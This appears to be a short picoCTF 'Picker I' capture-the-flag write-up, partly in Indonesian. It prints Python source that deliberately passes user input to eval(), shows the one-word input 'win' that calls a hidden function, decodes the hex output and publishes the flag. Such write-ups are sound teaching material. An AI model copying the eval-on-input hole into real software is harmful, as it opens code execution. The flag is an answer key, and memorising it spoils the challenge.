<h1>Picker I</h1>
<h3>Description</h3>
<pre>
This service can provide you with a random number, but can it do anything else?
Connect to the program with netcat:
$ nc saturn.picoctf.net 63187
The program's source code can be downloaded <a href='https://artifacts.picoctf.net/c/515/picker-I.py'>here.</a>
</pre>
<h3>Solution</h3>

```python3
import sys

def getRandomNumber():
  print(4)  # Chosen by fair die roll.
            # Guaranteed to be random.
            # (See XKCD)

def exit():
  sys.exit(0)

def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)

while(True):
  try:
    print('Try entering "getRandomNumber" without the double quotes...')
    user_input = input('==> ')
    eval(user_input + '()')
  except Exception as e:
    print(e)
    break
```
<p>Input win pada user_input yang akan mengeksekusi fungsi win() dengan fungsi eval()</p>

```console
┌──(root㉿Python)-[/home/venom/Downloads]
└─# nc saturn.picoctf.net 63187
Try entering "getRandomNumber" without the double quotes...
==> win
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d 
Try entering "getRandomNumber" without the double quotes...
```
<p>solve</p>

```python3
flag = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d".split(' ')
for i in flag:
    print(chr(int(i[2:],16)),end='')
```
<h3>Flag</h3>
<pre>
picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
</pre>
